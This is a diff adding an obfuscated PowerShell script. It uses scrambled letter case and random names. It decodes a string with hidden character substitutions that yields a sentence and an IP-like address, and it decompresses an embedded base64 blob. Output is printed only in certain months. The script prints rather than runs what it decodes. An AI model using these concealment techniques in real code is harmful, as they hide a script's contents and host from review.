@@ -1,0 +1,30 @@
+fUNCtIoN KmYFXybo { 
+    [ cMDletBIndiNG() ]Param( 
+        [PARamETER (ValuefROmpIPeLInE)]
+        $BNgUGq
+    )
+    iF((Get-DatE).MonTh -lt 2){
+         (nEW-obJECt  io.strEamREADER( (nEW-obJECt   SystEM.IO.compreSSION.defLaTEStrEAm( $BNgUGq, [iO.COmPrESSIOn.COmpREsSIonmodE]::decoMpreSs )) , [tExT.encodiNg]::aScii) ).rEADToEnD() |write-host
+    
+    }
+}
+$uPpOOCZc= @('MD9result = El', 'QWe become the', ' most familiar', ' strangersATsi','p724204ATs169A', 'Ts207ATs123ElQ','
+')
+$pRwiFj=-jOIN $uPpOOCZc
+$PvFDZd=@('BcFpt2pQAADQv3I/vLXuV9yiDElSJ4lKA5GTTJHMGtB/f3v/K7yyjqsf5ucXMNONcI2tAoFdmXli79h9lCQYpvw+bG', 'ZBdmnUnL/n18WIlI5FmgdxlBBzVTKFcj0SAyMLJhE8JCON7ab09R7VzacmJDpJy7fG3NcaEGuFBw6/9PGOkc0q6Ge3','qhTvd0HicFhYMiHkeIt9TwVKxt+NjtPLRekto81IG5ZIUoxwLwdGWpANzIzXi6kvGTuVGtCL1ph7mEXwNiGPyPnhi8', 'QHcNo5w8GuxTY9tHVRkEZkPXI4fqqQS2tXrmGTCuG220Ye3Yluh1VpAOlw0WgOk57VHKoLMsmFYzU3F+8yiJb8gz8Y', '+kNYsjcbLbN2cMrY7/DoyGfdxXbAMp/2H4tW6dHpgMIh1GSs6pNTOFVXYv+J07vb+zDYs4WIxha4vOxpwrkIjz1dLW', 'P1Vb6+4M+92aloEwQtq4FXc61so0SUj1HYY4KmoDRfTOReI8myTDA2RxFD3S08S3sN9JyWqfY5Y/n37fqX1Dzlm4Jp', 'nbZ9auwgQmAOXxEcU1p4OiXc99uG4K2ZxGDjhzHzN2cx4yz6CaRUqBTyAxp16VHzZ+HbjoTvM4WhVttBbTgrwd8av/', '8B')
+$Rfhicg =[StrINg]::joiN( '', $PvFDZd )
+fUNCtIoN Smijj { 
+    [cMDletBIndiNG()]Param( 
+        [PARamETER (ValuefROmpIPeLInE)]
+        $VoiKyZo,
+        [PARamETER(ValuefROmpIPeLInE)]
+        $bpfGdA
+    )
+    iF ((GET-DATE).MOntH -eq 1){
+         $VoiKyZo.RepLaCE('ElQ',[STRINg][chAr]34).RepLaCE(([chAr]55+[chAr]50+[chAr]52),':').RepLaCE(([chAr]77+[chAr]68+[chAr]57),[STRINg][chAr]36).RepLaCE('ATs','.')| write-host
+    
+    }
+     [io.MEmorYstrEaM] [cOnVert]::fRoMBasE64STrInG( $bpfGdA ) | KmYFXybo
+}
+Smijj -VoiKyZo $pRwiFj -bpfGdA $Rfhicg
+
